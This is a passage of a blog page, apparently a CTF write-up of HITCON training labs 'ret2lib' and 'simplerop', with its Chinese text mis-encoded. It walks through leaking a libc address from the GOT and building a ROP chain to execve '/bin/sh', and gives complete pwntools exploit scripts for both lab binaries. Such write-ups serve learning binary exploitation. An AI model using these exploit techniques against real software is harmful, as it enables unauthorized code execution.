<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html>
  <head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  
  
  <title>  Pwn-10æœˆ24-Hitcon(äºŒ) |   Xiaoyifeng&#39;s blog </title>

 
  
    <link rel="icon" href="/images/favicon.png">
  


  <link rel="stylesheet" href="/nayo.min.css"> 
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>  
  <body>   
    
      <header class="header">
	
  <nav class="header-inner">        

    <span class="iconfont icon-menu mobile-toggle"></span>   	

    <div class="header-logo">
      <a href="/">
        <img class="header-logo-img" src="/images/logo.png">
      </a>
    </div>

    <div class="header-menu">          
              
          
            <a class="header-menu-link" id="header-menu-home" href="/">
              <i class="iconfont icon-home">  
            </i></a>     
          
              
          
            <a class="header-menu-link" id="header-menu-archives" href="/archives">
              <i class="iconfont icon-archives">  
            </i></a>     
          
              
          
            <a class="header-menu-link" id="header-menu-tags" href="/tags">
              <i class="iconfont icon-tags">  
            </i></a>     
          
              
          
            <a class="header-menu-link" id="header-menu-about" href="/about">
              <i class="iconfont icon-about">  
            </i></a>     
          
              
          
              <a class="header-menu-link" id="header-menu-search">
                <i class="iconfont icon-search">  
              </i></a>
          
                  
    </div>  
    
  </nav>
</header>

   

      <div class="container">       
          
          
            <div class="container-inner">  
          

          <article class="post">
  
	
<div class="post-header">
	<div class="post-header-inner">
		<p class="post-title">	
			Pwn-10æœˆ24-Hitcon(äºŒ)
		</p>
		<div class="post-info">	
			<span class="post-info-entry">
				10æœˆ 24, 2018
			</span>

			
			
				<i class="iconfont icon-words"></i>
				<span class="post-info-entry">3090
				</span>
			
		</div>
	</div>
</div> 
	
 

	  <div class="typo post-content slideDownMin">

		

			
					<p>â€¦â€¦</p>
<a id="more"></a>
<h1 id="Pwn-10æœˆ24-hitcon-äºŒ"><a href="#Pwn-10æœˆ24-hitcon-äºŒ" class="headerlink" title="Pwn-10æœˆ24-hitcon(äºŒ)"></a>Pwn-10æœˆ24-hitcon(äºŒ)</h1><blockquote>
<p>ç»§ç»­hitconçš„è§£é¢˜ä¹‹è·¯ã€‚</p>
</blockquote>
<h2 id="lab4-ret2lib"><a href="#lab4-ret2lib" class="headerlink" title="lab4 - ret2lib"></a>lab4 - ret2lib</h2><blockquote>
<p>æ‹¿åˆ°é¢˜ç›®çœ‹é¢˜ç›®åï¼Œå’Œlab3çš„ret2scå·®ä¸å¤šï¼Œè¿™ä¸ªåº”è¯¥æ˜¯return to libcï¼Œä¹Ÿæ˜¯ä¸€ç§æ”»å‡»æ‰‹æ³•ã€‚æ³„éœ²libcå¹¶ä¸”leakå‡ºlibcåŸºåœ°å€ï¼Œä»è€Œgetshellï¼ŸğŸ˜„</p>
</blockquote>
<h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote>
<p><code>checksec ret2lib</code>:</p>
<p><img src="https://i.loli.net/2018/10/24/5bcffda0c6f43.png" alt=""></p>
</blockquote>
<h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote>
<p>ç®€å•è·‘ä¸€ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2018/10/24/5bd0000628c22.png" alt=""></p>
<p>ç¨‹åºè®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªåœ°å€ï¼Œä»¥æ•´å‹çš„å½¢å¼è¾“å…¥ï¼Œç„¶åå®ƒä¼šè¿”å›è¿™ä¸ªåœ°å€å­˜æœ‰çš„å†…å®¹ç»™æˆ‘ä»¬ï¼Œç„¶åè®©æˆ‘ä»¬<code>leave some message</code>ï¼Œå¹¶ä¸”æ‰“å°å‡ºæ¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªåŠŸèƒ½ä»GOTè¡¨ä¸­å°†ä¸€äº›å‡½æ•°çš„çœŸå®åœ°å€æ‰“å°å‡ºæ¥ï¼Œç„¶åé€šè¿‡libcæ–‡ä»¶ä¸­å‡½æ•°çš„åç§»é‡è®¡ç®—åŸºåœ°å€ï¼Œä¾‹å¦‚å°†æŸä¸€ä¸ªå‡½æ•°çš„GOTæ¡ç›®çš„åœ°å€ä¼ ç»™writeå‡½æ•°ï¼Œå°±å¯ä»¥æ³„æ¼è¿™ä¸ªå‡½æ•°åœ¨è¿›ç¨‹ç©ºé—´ä¸­çš„çœŸå®åœ°å€ï¼Œ<strong>GOTè¡¨ä¸­æ‰€å­˜çš„putså‡½æ•°çš„åœ°å€ä¾¿æ˜¯åœ¨ret2libè¿›ç¨‹ä¸­çš„å®é™…åœ°å€ã€‚</strong></p>
<p>IDAé‡Œé¢çœ‹çœ‹ï¼š</p>
<p><img src="https://i.loli.net/2018/10/24/5bd003fbb31e4.png" alt=""></p>
<p>é€šè¿‡å‘½ä»¤<code>readelf -V ret2lib</code>å¯ä»¥æŸ¥åˆ°å…¶libcåº“ç‰ˆæœ¬ä¸º<code>libc.so.6</code>ï¼š</p>
<p><img src="https://i.loli.net/2018/10/24/5bd009e18b194.png" alt=""></p>
<p>é€šè¿‡pwntoolsçš„elfæ¨¡å—æˆ‘ä»¬å¯ä»¥é“¾æ¥è¯¥libc.so.6åº“ï¼Œç®€å•çœ‹çœ‹é‡Œé¢çš„å‡½æ•°åœ°å€ï¼š</p>
<p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd00c1190711.png" class="lazyload"></p>
<p>åŒæ ·é’ˆå¯¹è¿™é¢˜å¯ä»¥ä½¿ç”¨IDA <code>alt + t</code>æ¥æŸ¥æ‰¾GOTè¡¨putsåœ°å€ï¼Œä¹Ÿå¯é€šè¿‡ä¸Šè¿°ELFæ¨¡å—é“¾æ¥ret2libç¨‹åºï¼Œé€šè¿‡<code>elf.got[&#39;puts&#39;]</code>æ¥è·å–GOTè¡¨ä¸­putsæ¡ç›®åœ°å€:</p>
<p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd00d4fb5348.png" class="lazyload"></p>
<p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd00d70f16de.png" class="lazyload"></p>
<p>å°†134520860ä½œä¸ºæˆ‘ä»¬éœ€è¦è·å¾—å†…å®¹çš„åœ°å€è¾“å…¥ç¨‹åºï¼š</p>
<pre class=" language-bash"><code class="language-bash">Do you know <span class="token keyword">return</span> to library ?
<span class="token comment" spellcheck="true">###############################</span>
What <span class="token keyword">do</span> you want to see <span class="token keyword">in</span> memory?
Give me an address <span class="token punctuation">(</span>in dec<span class="token punctuation">)</span> :134520860                                           
The content of the address <span class="token keyword">:</span> 0xf7639250
</code></pre>
<p>ç„¶åæˆ‘ä»¬å°±å¾—åˆ°äº†putså‡½æ•°æ¡ç›®åœ¨å­˜åœ¨GOTè¡¨ä¸­çš„å†…å®¹ï¼Œå³<strong>æ­¤æ¬¡</strong>ç¨‹åºè¿è¡Œæ—¶putså‡½æ•°çš„çœŸå®åœ°å€<code>0xf7639250</code>ã€‚</p>
<p>libcåŸºåœ°å€è®¡ç®—ï¼š<strong>libcbase_addr = puts_addr - libc_puts = 0xf7639250 - 0x67250 = 0xf75d2000</strong></p>
<p>è¿™é‡Œæˆ‘åªæ˜¯ç®€å•çš„å±•ç¤ºä¸€ä¸‹è®¡ç®—æ–¹æ³•ï¼Œå®é™…ä¸Šåœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­libcçš„<strong>åŸºåœ°å€æ˜¯ä¼šå‘ç”Ÿå˜åŒ–çš„</strong>ï¼Œæ‰€ä»¥ä¸èƒ½æå‰è®¡ç®—å¥½åŸºåœ°å€ï¼Œå†å†™expï¼Œè¦åœ¨expé‡Œé¢è®¡ç®—åŸºåœ°å€ï¼Œè¿™æ ·å°±ä¸ä¼šå‡ºé”™ã€‚</p>
<p>æ—¢ç„¶å·²ç»å¯ä»¥è®¡ç®—å‡ºsystemå‡½æ•°çš„åœ°å€äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ‰¾ä¸€ä¸ªshï¼Œå¯ä»¥å¯»æ‰¾binaryç¨‹åºæœ¬èº«ä¸­çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨libcä¸­çš„ï¼š</p>
<p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd012dbb4bb5.png" class="lazyload"></p>
<p>ç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡Print_message()å‡½æ•°æº¢å‡ºï¼Œè¦†ç›–EIPçš„å€¼ä½¿å…¶è·³è½¬æ‰§è¡Œsystemå‡½æ•°ï¼š</p>
<p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd017ba13b3e.png" class="lazyload"></p>
<p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd018a67369c.png" class="lazyload"></p>
<p>å¯ä»¥çœ‹åˆ°paddingé•¿åº¦ä¸º60ï¼Œæ¥ä¸‹æ¥å†™expå³å¯.</p>
</blockquote>
<h3 id="æ„é€ exp"><a href="#æ„é€ exp" class="headerlink" title="æ„é€ exp"></a>æ„é€ exp</h3><blockquote>
<p>libcbase_addr = puts_addr - libc_puts</p>
<p>system_addr = libcbase_addr + libc.symbols[â€˜systemâ€™]</p>
<p>return_addr = â€˜anythingâ€™</p>
<p>exp:</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#coding:utf-8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ret2lib"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>
libc_puts <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>

io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" : "</span><span class="token punctuation">)</span>
libcbase_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc_puts
return_addr <span class="token operator">=</span> <span class="token number">0x0804857D</span> <span class="token comment" spellcheck="true">#mainå‡½æ•°åœ°å€</span>

success<span class="token punctuation">(</span><span class="token string">"libcbase_addr -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcbase_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> libcbase_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>

payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> return_addr<span class="token punctuation">,</span> next<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#sh\x00æ˜¯å› ä¸ºå¯èƒ½åŒ¹é…åˆ°å…¶ä»–å­—ç¬¦ä¸²ï¼Œä»è€ŒåŠ ä¸ªæˆªæ–­</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
</blockquote>
<p>è¿è¡Œæ•ˆæœï¼š</p>
<p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd01b3e9b344.png" class="lazyload"></p>
<h2 id="lab5-simplerop"><a href="#lab5-simplerop" class="headerlink" title="lab5-simplerop"></a>lab5-simplerop</h2><blockquote>
<p>simplerop ==&gt; easyrop ==&gt; babyrop?ç»å†ç»æœ›çš„è¿‡ç¨‹ğŸ˜­ï¼Œåˆæ˜¯ä¸€ä¸ªæ„é€ ropchainçš„é¢˜ç›®ã€‚</p>
</blockquote>
<h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote>
<p><code>checksec ./simplerop</code></p>
<p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd02cfbed61f.png" class="lazyload"></p>
<p>å¼€å¯äº†NXï¼Œæ ˆä¸å¯æ‰§è¡Œé˜²æŠ¤ã€‚</p>
</blockquote>
<h3 id="é€»è¾‘åˆ†æ-1"><a href="#é€»è¾‘åˆ†æ-1" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote>
<p>é€šè¿‡idaçœ‹çœ‹ï¼š</p>
<p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd037bdc39d0.png" class="lazyload"></p>
<p>é€»è¾‘ååˆ†ç®€å•ï¼Œå°±æº¢å‡ºç„¶åæ„é€ rop chainï¼Œé€šè¿‡gdbåŠ¨æ€è°ƒè¯•å¾—åˆ°æº¢å‡ºç‚¹ï¼Œpaddingä¸º32ï¼š</p>
<p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd0380835b4e.png" class="lazyload"></p>
<p>ä½†æ˜¯è¿™ä¸ªé¢˜å‹è²Œä¼¼å«ï¼š<code>ret2systemcall</code>ï¼Œæ­¤ç¨‹åºä¸­æ—¢æ— systemå‡½æ•°ï¼Œä¹Ÿæ— /bin/shå­—ç¬¦ä¸²ï¼Œè¿˜æ˜¯é™æ€ç¼–è¯‘ï¼Œæ–°å§¿åŠ¿ ==&gt;rop chainå int 0x80ä¸­æ–­ä»è€Œæ‰§è¡Œç³»ç»Ÿè°ƒç”¨==&gt; <code>execve(/bin/sh)</code>ã€‚</p>
<p><strong>åŸç†ï¼šé€šè¿‡ä¸€ç³»åˆ— pop|ret ç­‰gadgetï¼Œä½¿å¾— eax = 0xbï¼ˆexecve 32 ä½ä¸‹çš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰ï¼Œebx -&gt; /bin/shï¼Œ ecx = edx = 0ï¼Œç„¶åé€šè¿‡ <code>int 0x80</code> å®ç°ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰§è¡Œ execve(â€œ/bin/shâ€, 0, 0)</strong></p>
<p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd03efc07ec3.png" class="lazyload"></p>
</blockquote>
<p>ä¸çŸ¥é“ä¸ºå•¥æˆ‘çš„ROPgadgetæŸ¥ä¸åˆ°æˆ‘ä»¬æƒ³è¦çš„gadgetã€‚</p>
<h3 id="æ„é€ exp-1"><a href="#æ„é€ exp-1" class="headerlink" title="æ„é€ exp"></a>æ„é€ exp</h3><blockquote>
<p>exp:</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#coding:utf-8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>  
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./simplerop'</span><span class="token punctuation">)</span>  
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./simplerop'</span><span class="token punctuation">)</span>  

pop_edx_ecx_ebx <span class="token operator">=</span> <span class="token number">0x0806eca0</span>  
pop_eax <span class="token operator">=</span> <span class="token number">0x080b7e26</span>  
pop_edx <span class="token operator">=</span> <span class="token number">0x0806ec7a</span>  
int_80 <span class="token operator">=</span> <span class="token number">0x0806c8f5</span>  
gadget <span class="token operator">=</span> <span class="token number">0x080707b9</span> <span class="token comment" spellcheck="true"># mov word ptr [edx],eax  </span>
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>  
read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>  


p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>  
payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">32</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span> <span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>  
payload <span class="token operator">+=</span>  p32<span class="token punctuation">(</span>pop_edx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/sh\x00"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>  
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span>  
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>int_80<span class="token punctuation">)</span>  

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre>
</blockquote>
<p>è¿è¡Œæ•ˆæœï¼š</p>
<p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/24/5bd043f350073.png" class="lazyload"></p>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å†…å®¹æ¶‰åŠ: libcæ³„éœ²ï¼Œleak libcåŸºåœ°å€ï¼Œropchainç³»ç»Ÿè°ƒç”¨ï¼ˆint 0x80ï¼‰ã€‚</p>
<p>ropchainç³»ç»Ÿè°ƒç”¨åŸç†ï¼šåœ¨æ— systemå‡½æ•°ï¼Œ/bin/shå¯ç”¨çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä¸€ç³»åˆ— pop|ret ç­‰gadgetï¼Œä½¿å¾— eax = 0xbï¼ˆexecve 32 ä½ä¸‹çš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰ï¼Œebx -&gt; /bin/shï¼Œ ecx = edx = 0ï¼Œç„¶åé€šè¿‡ <code>int 0x80</code> å®ç°ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰§è¡Œ execve(â€œ/bin/shâ€, 0, 0)ã€‚</p>
  	
					
	  </div>     
	  

	<div class="post-footer">


  <div class="post-footer-other">
    
      <span class="post-footer-item">
        


<span class="donate-btn">
	<span class="iconfont icon-donate"></span>
</span>

<div id="donate-box" class="sildeUpMin">

	<span class="donate-cancel iconfont icon-cancel"></span>

	<div class="donate-img-box">
		<img id="donate-qr-wechat" class="noLazyLoad donate-img lazyload" src="/images/placeholder.png" alt="No Donate Image!" data-src="/images/donate1.png">	
		<img id="donate-qr-alipay" class="noLazyLoad donate-img lazyload" src="/images/placeholder.png" alt="No Donate Image!" data-src="/images/donate2.png">	
	</div>

	<span class="donate-word">ä¸è´Ÿè‡ªå·±ï¼Œä¸è´Ÿé’å¤©</span>

	<div class="donate-list">
		<span class="iconfont icon-donate-wechat"></span>
		<span class="iconfont icon-donate-alipay"></span>
	</div>

</div>
 
      </span>        
       
    
      <span class="post-footer-item">
        <span class="share-btn">
	<span class="iconfont icon-share"></span>
</span>
<div class="-mob-share sildeUpMin">
	<ul class="-mob-inner">
	   			             
        <li class="iconfont 
		icon-share-qq 
		-mob-share-qq 
		-mob-share-link"></li>		
   	   			             
        <li class="iconfont 
		icon-share-weixin 
		-mob-share-weixin 
		-mob-share-link"></li>		
   	   			             
        <li class="iconfont 
		icon-share-weibo 
		-mob-share-weibo 
		-mob-share-link"></li>		
   	   			             
        <li class="iconfont 
		icon-share-douban 
		-mob-share-douban 
		-mob-share-link"></li>		
   	   			             
        <li class="iconfont 
		icon-share-facebook 
		-mob-share-facebook 
		-mob-share-link"></li>		
   	   			             
        <li class="iconfont 
		icon-share-twitter 
		-mob-share-twitter 
		-mob-share-link"></li>		
   	   			             
        <li class="iconfont 
		icon-share-google 
		-mob-share-google 
		-mob-share-link"></li>		
   	   
	</ul>
</div>	


<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
      </span>  
               
  </div>  
    


  <div class="post-footer-meta">
        
          <i class="iconfont icon-category"></i>       
          <a class="category-link" href="/categories/CTF/">CTF</a> 	
      
        	

        
          <i class="iconfont icon-tag"></i>     
            <a class="tag-link" href="/tags/CTF/">CTF</a> <a class="tag-link" href="/tags/Pwn/">Pwn</a> <a class="tag-link" href="/tags/äºŒè¿›åˆ¶å®‰å…¨/">äºŒè¿›åˆ¶å®‰å…¨</a>    
        	
  </div>

</div>


<nav class="post-footer-nav">
  <div class="post-footer-link">
  
      <a href="/2018/10/23/Pwn-10æœˆ23-Hitcon-ä¸€/" id="post-nav-older" class="post-nav-link-wrap">
        <strong class="post-nav-caption">older</strong>
        
          <span class="post-nav-title">
            Pwn-10æœˆ23-Hitcon(ä¸€)
          </span>
      </a>
  
  </div>
  <div class="post-footer-link">
    
        <a href="/2018/10/25/Pwn-10æœˆ25-Hitcon-ä¸‰/" id="post-nav-newer" class="post-nav-link-wrap">
          <strong class="post-nav-caption">newer</strong>
             
            <span class="post-nav-title">
              Pwn-10æœˆ25-Hitcon(ä¸‰)
            </span>
        </a>
    
  </div>

</nav>
 
	
	
</article>

	<div class="toc-container">
			<div class="toc-sidebar">
			<p class="toc-title">
				CONTENT
			</p>
			<div class="toc-list">
				<ol class="toc-inner"><li class="toc-inner-item toc-inner-level-1"><a class="toc-inner-link" href="#Pwn-10æœˆ24-hitcon-äºŒ"><span class="toc-inner-text">Pwn-10æœˆ24-hitcon(äºŒ)</span></a><ol class="toc-inner-child"><li class="toc-inner-item toc-inner-level-2"><a class="toc-inner-link" href="#lab4-ret2lib"><span class="toc-inner-text">lab4 - ret2lib</span></a><ol class="toc-inner-child"><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#æ£€æŸ¥ä¿æŠ¤æªæ–½"><span class="toc-inner-text">æ£€æŸ¥ä¿æŠ¤æªæ–½</span></a></li><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#é€»è¾‘åˆ†æ"><span class="toc-inner-text">é€»è¾‘åˆ†æ</span></a></li><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#æ„é€ exp"><span class="toc-inner-text">æ„é€ exp</span></a></li></ol></li><li class="toc-inner-item toc-inner-level-2"><a class="toc-inner-link" href="#lab5-simplerop"><span class="toc-inner-text">lab5-simplerop</span></a><ol class="toc-inner-child"><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><span class="toc-inner-text">æ£€æŸ¥ä¿æŠ¤æªæ–½</span></a></li><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#é€»è¾‘åˆ†æ-1"><span class="toc-inner-text">é€»è¾‘åˆ†æ</span></a></li><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#æ„é€ exp-1"><span class="toc-inner-text">æ„é€ exp</span></a></li></ol></li><li class="toc-inner-item toc-inner-level-2"><a class="toc-inner-link" href="#å°ç»“"><span class="toc-inner-text">å°ç»“</span></a></li></ol></li></ol>
			</div>
		</div>
	</div>

          </div> 
      </div>            
    
    <a id="page-backTop">
      <span>
        <i class="iconfont icon-backtotop"></i>
      </span>
    </a> 

  
    
    <div class="search-container sildeUpMin">
        <div class="search-header">
            <input type="text" placeholder="è¾“å…¥ä½ æƒ³æœç´¢çš„" id="search-input" class="search-input">
            <span class="search-cancel">
                <i class="iconfont icon-cancel">
            </i></span>
        </div>
        <div id="search-result" class="search-result"></div>
    </div>
 
     <div class="mobile-menu">      

      
      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/favicon.png">  
      

         
            

            <a class="mobile-menu-link" href="/">é¦–é¡µ
            </a>
            
         
            

            <a class="mobile-menu-link" href="/archives">å½’æ¡£
            </a>
            
         
            

            <a class="mobile-menu-link" href="/tags">æ ‡ç­¾
            </a>
            
         
            

            <a class="mobile-menu-link" href="/about">å…³äº
            </a>
            
         
                          

            <a class="mobile-menu-link mobile-menu-search" href="#">æœç´¢ </a>                 
            
         
      
</div>
        
    



     
    




<footer id="footer">	    

		
		<div class="footer-copyright">
		&copy;
				
		2018-
		
		2019		
	
		xiaoyifeng
		<br>

		Theme  <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
		</div>			
	 
</footer>   

    <script src="/nayo.bundle.js"></script>           
  <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":100,"height":170},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>        
</html>